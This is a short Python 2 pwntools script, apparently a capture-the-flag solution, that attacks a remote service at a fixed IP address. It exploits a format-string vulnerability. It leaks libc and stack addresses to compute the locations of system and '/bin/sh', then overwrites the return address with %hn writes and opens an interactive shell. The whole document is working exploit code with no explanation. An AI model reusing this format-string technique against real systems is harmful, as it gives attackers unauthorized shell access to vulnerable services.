from pwn import *


v2=0x804c010
p=remote("54.225.38.91",1026)
#p=process("./main")
payload=""
payload+=p32(v2)
payload+="%30x"
payload+="%6$hn"
p.sendline(payload)
p.recv()
p.recvline()
p.recvline()
p.recvline()

p.sendline("%19$x")
leak=int(p.recvline()[:-1],16)-249
base=leak-0x01eec0
system=base+0x0458b0
binsh=base+0x19042d
print "leak :",hex(leak)
print "base :",hex(base)
print "system :",hex(system)
print "binsh :",hex(binsh)
p.recvline()

p.sendline("%14$x")
eip=int(p.recvline()[:-1],16)-160
print "eip :",hex(eip)

number=system & 0xffff
payload=""
payload+=p32(eip)
payload+="%"+str(number-4)+"x"
payload+="%6$hn"
p.sendline(payload)


number=(system >> 16) & 0xffff
payload=""
payload+=p32(eip+2)
payload+="%"+str(number-4)+"x"
payload+="%6$hn"
p.sendline(payload)


number=binsh & 0xffff
payload=""
payload+=p32(eip+8)
payload+="%"+str(number-4)+"x"
payload+="%6$hn"
p.sendline(payload)


number=(binsh >> 16) & 0xffff

payload=""
payload+=p32(eip+10)
payload+="%"+str(number-4)+"x"
payload+="%6$hn"
p.sendline(payload)

for i in range(28):
	p.sendline("a")

p.interactive()


